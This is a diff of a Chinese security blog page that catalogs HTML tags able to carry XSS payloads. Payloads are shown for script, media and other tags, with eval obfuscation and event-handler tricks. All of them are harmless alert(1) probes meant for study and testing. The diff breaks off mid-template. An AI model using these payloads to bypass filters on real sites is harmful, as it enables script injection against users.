@@ -1,4 +1,213 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="d2VsY29tZSB0byBteSBibG9n"><meta name="keywords" content="Cyber Security"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style-dark.css?v=2.0.4"><link rel="stylesheet" type="text/css" href="/css/highlight-dark.css?v=2.0.4"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><title>一些加载XSS Payload的标签 | Mi1k7ea的新闻栏</title></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">一些加载XSS Payload的标签</h1><a id="logo" href="/.">Mi1k7ea的新闻栏</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="https://blog.csdn.net/ski_12/"><i class="fa fa-you"> CSDN</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">一些加载XSS Payload的标签</h1><div class="post-meta"><a href="/2019/02/19/一些加载XSS-Payload的标签/#comments" class="comment-count"><i data-disqus-identifier="2019/02/19/一些加载XSS-Payload的标签/" class="disqus-comment-count"></i>留言</a><p><span class="date">Feb 19, 2019</span><span><a href="/categories/Web安全基础/" class="category">Web安全基础</a></span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>点击</i></i></span></p></div><div class="post-content"><p>之前整理的一些可以加载XSS Payload的标签，后面还会继续更新。</p>
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,XSS,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/kanxi.jpg">
+  
+  <title>一些加载XSS Payload的标签 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+      <img class="avatar" src="/j.jpg">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="post" class="pure-menu-link">文章</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/archives" style="color:#202020;" class="pure-menu-link">归档</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories" style="color:#202020;" class="pure-menu-link">分类</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/tags" style="color:#202020;" class="pure-menu-link">标签</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="Web安全" class="pure-menu-link">Web安全</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Web安全基础/" style="color:#202020;" class="pure-menu-link">Web安全基础&amp;Tricks</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/PHP/" style="color:#202020;" class="pure-menu-link">PHP</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Java/" style="color:#202020;" class="pure-menu-link">Java</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Python/" style="color:#202020;" class="pure-menu-link">Python</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/JavaScript/" style="color:#202020;" class="pure-menu-link">JavaScript</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Web/" style="color:#202020;" class="pure-menu-link">WriteUp Web</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="二进制安全" class="pure-menu-link">二进制安全</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/二进制基础/" style="color:#202020;" class="pure-menu-link">二进制基础</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Pwn/" style="color:#202020;" class="pure-menu-link">Pwn</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/C-C/" style="color:#202020;" class="pure-menu-link">C/C++</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Pwn/" style="color:#202020;" class="pure-menu-link">WriteUp Pwn</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Reverse/" style="color:#202020;" class="pure-menu-link">WriteUp Reverse</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="渗透测试" class="pure-menu-link">渗透测试</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">null</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="about" class="pure-menu-link">关于</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/about" style="color:#202020;" class="pure-menu-link">Mi1k7ea</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="https://blog.csdn.net/ski_12" style="color:#202020;" class="pure-menu-link">CSDN博客</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/atom.xml" style="color:#202020;" class="pure-menu-link">订阅</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        一些加载XSS Payload的标签
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-02-19T14:54:12.000Z">
+        2019-02-19
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+    </header>
+
+    <div class="post-content">
+      <p>之前整理的一些可以加载XSS Payload的标签，后面还会继续更新。</p>
 <h2 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h2><p>这个标签不用多说。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">"\x61\x6c\x65\x72\x74\x28\x31\x29"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> x=<span class="built_in">eval</span>;x(alert(<span class="number">1</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(<span class="number">1</span>, <span class="number">2</span>, <span class="built_in">eval</span>)(alert(<span class="number">1</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>.call(<span class="literal">null</span>, <span class="string">'alert(1)'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">Mi1k7ea();<span class="function"><span class="keyword">function</span> <span class="title">Mi1k7ea</span><span class="params">()</span></span>&#123;alert(<span class="number">1</span>);&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h2><p>其实，利用到javascript伪协议的payload，可以不用添加引号。</p>
@@ -38,13 +247,216 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//audio标签，对应MP3文件</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">oncanplay</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">ondurationchange</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span>=<span class="string">"true"</span> <span class="attr">onended</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onloadeddata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onloadedmetadata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onloadstart</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onprogress</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onsuspend</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">javascript:alert(1)</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">//video标签，对应MP4文件</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">oncanplay</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">ondurationchange</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">autoplay</span>=<span class="string">"true"</span> <span class="attr">onended</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onloadeddata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onloadedmetadata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onloadstart</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onprogress</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onsuspend</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">javascript:alert(1)</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span> /&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/195507.html" target="_blank" rel="noopener">他山之石 | 对 XSS 的一次深入分析认识</a></p>
 <p><a href="https://www.cnblogs.com/hookjoy/p/6181350.html" target="_blank" rel="noopener">xss其他标签下的js用法总结大全</a></p>
-</div><div class="post-copyright"><blockquote><p>原文作者: Mi1k7ea</p><p>原文链接: <a href="https://www.mi1k7ea.com/2019/02/19/一些加载XSS-Payload的标签/">https://www.mi1k7ea.com/2019/02/19/一些加载XSS-Payload的标签/</a></p><p>版权声明: 转载请注明出处(必须保留作者署名及链接)</p></blockquote></div><div class="tags"><a href="/tags/Web安全/">Web安全</a><a href="/tags/XSS/">XSS</a></div><div class="post-share"><div class="social-share"><span>分享到:</span></div><div class="bdsharebuttonbox"><span style="float:left;line-height: 28px;height: 28px;font-size:16px;font-weight:blod">分享到:</span><a href="#" data-cmd="more" class="bds_more"></a><a href="#" data-cmd="mshare" title="分享到一键分享" class="bds_mshare"></a><a href="#" data-cmd="fbook" title="分享到Facebook" class="bds_fbook"></a><a href="#" data-cmd="twi" title="分享到Twitter" class="bds_twi"></a><a href="#" data-cmd="linkedin" title="分享到linkedin" class="bds_linkedin"></a><a href="#" data-cmd="youdao" title="分享到有道云笔记" class="bds_youdao"></a><a href="#" data-cmd="evernotecn" title="分享到印象笔记" class="bds_evernotecn"></a><a href="#" data-cmd="weixin" title="分享到微信" class="bds_weixin"></a><a href="#" data-cmd="qzone" title="分享到QQ空间" class="bds_qzone"></a><a href="#" data-cmd="tsina" title="分享到新浪微博" class="bds_tsina"></a></div></div><div class="post-nav"><a href="/2019/02/21/一道绕过CSP的XSS题目/" class="pre">一道绕过CSP的XSS题目</a><a href="/2019/02/16/个人XSS-payload收集/" class="next">个人XSS payload收集</a></div><div id="comments"><div id="disqus_thread"></div></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">文章目录</i></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#script标签"><span class="toc-text">script标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#a标签"><span class="toc-text">a标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#img标签"><span class="toc-text">img标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#body标签"><span class="toc-text">body标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#svg标签"><span class="toc-text">svg标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#form标签"><span class="toc-text">form标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#input标签"><span class="toc-text">input标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#style标签"><span class="toc-text">style标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iframe标签"><span class="toc-text">iframe标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#object标签"><span class="toc-text">object标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#span标签"><span class="toc-text">span标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#marquee标签"><span class="toc-text">marquee标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Media类型标签"><span class="toc-text">Media类型标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-gui"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C/C++</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a><span class="category-list-count">18</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全基础/">Web安全基础</a><span class="category-list-count">22</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUp-Pwn/">WriteUp:Pwn</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUp-Reverse/">WriteUp:Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUp-Web/">WriteUp:Web</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制基础/">二进制基础</a><span class="category-list-count">7</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> 标签</i></div><div class="tagcloud"><a href="/tags/XML注入/" style="font-size: 15px;">XML注入</a> <a href="/tags/Web安全/" style="font-size: 15px;">Web安全</a> <a href="/tags/AWD/" style="font-size: 15px;">AWD</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/C-C/" style="font-size: 15px;">C/C++</a> <a href="/tags/JavaScript/" style="font-size: 15px;">JavaScript</a> <a href="/tags/二进制/" style="font-size: 15px;">二进制</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/栈溢出/" style="font-size: 15px;">栈溢出</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/SQL注入/" style="font-size: 15px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/Flash/" style="font-size: 15px;">Flash</a> <a href="/tags/Java/" style="font-size: 15px;">Java</a> <a href="/tags/安全开发/" style="font-size: 15px;">安全开发</a> <a href="/tags/CORS/" style="font-size: 15px;">CORS</a> <a href="/tags/命令注入/" style="font-size: 15px;">命令注入</a> <a href="/tags/CSWSH/" style="font-size: 15px;">CSWSH</a> <a href="/tags/CSRF/" style="font-size: 15px;">CSRF</a> <a href="/tags/SSI注入/" style="font-size: 15px;">SSI注入</a> <a href="/tags/SpEL注入/" style="font-size: 15px;">SpEL注入</a> <a href="/tags/Spring/" style="font-size: 15px;">Spring</a> <a href="/tags/堆溢出/" style="font-size: 15px;">堆溢出</a> <a href="/tags/SSTI/" style="font-size: 15px;">SSTI</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/MongoDB/" style="font-size: 15px;">MongoDB</a> <a href="/tags/JNDI注入/" style="font-size: 15px;">JNDI注入</a> <a href="/tags/沙箱逃逸/" style="font-size: 15px;">沙箱逃逸</a> <a href="/tags/文件上传/" style="font-size: 15px;">文件上传</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> 归档</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> 友情链接</i></div><ul></ul><a href="https://blog.csdn.net/ski_12" title="CSDN" target="_blank">CSDN</a></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/atom.xml">订阅本站</a> |  <a href="/about/">联系博主</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy; Mi1k7ea</span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.4"></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.4" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script><script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","weixin","tsina","qzone","linkedin","fbook","twi","print","renren","sqq","evernotecn","bdysc","tqq","tqf","bdxc","kaixin001","tieba","douban","bdhome","thx","ibaidu","meilishuo","mogujie","diandian","huaban","duitang","hx","fx","youdao","sdo","qingbiji","people","xinhua","mail","isohu","yaolan","wealink","ty","iguba","h163","copy"],"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{},"image":{"viewList":["tsina","qzone","weixin","fbook","twi","linkedin","youdao","evernotecn","mshare"],"viewText":"分享到：","viewSize":"16"},"selectShare":{"bdContainerClass":null,"bdSelectMiniList":["tsina","qzone","weixin","fbook","twi","linkedin","youdao","evernotecn","mshare"]}};with(document)0[(getElementsByTagName('head')[0]||head).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
-</script><script>var disqus_shortname = 'mi1k7ea';
-var disqus_identifier = '2019/02/19/一些加载XSS-Payload的标签/';
-var disqus_title = '一些加载XSS Payload的标签';
-var disqus_url = 'https://www.mi1k7ea.com/2019/02/19/一些加载XSS-Payload的标签/';
-(function() {
-  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-})();</script><script id="dsq-count-scr" src="//mi1k7ea.disqus.com/count.js" async></script><script type="text/javascript" src="//mi1k7ea.disqus.com/recent_comments_widget.js?num_items=5&amp;hide_avatars=1&amp;avatar_size=32&amp;excerpt_length=20&amp;hide_mods=1"></script></body></html>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#script标签"><span class="toc-text">script标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#a标签"><span class="toc-text">a标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#img标签"><span class="toc-text">img标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#body标签"><span class="toc-text">body标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#svg标签"><span class="toc-text">svg标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#form标签"><span class="toc-text">form标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#input标签"><span class="toc-text">input标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#style标签"><span class="toc-text">style标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iframe标签"><span class="toc-text">iframe标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#object标签"><span class="toc-text">object标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#span标签"><span class="toc-text">span标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#marquee标签"><span class="toc-text">marquee标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Media类型标签"><span class="toc-text">Media类型标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+<div class="share" style="width: 100%;">
+  <img src="" alt="" style="margin: auto; display: block;"/>
+
+  <div style="margin: auto; text-align: center; font-size: 0.8em; color: grey;">test</div>
+  
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/02/16/个人XSS-payload收集/" rel="next" title="个人XSS payload收集">
+          个人XSS payload收集
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
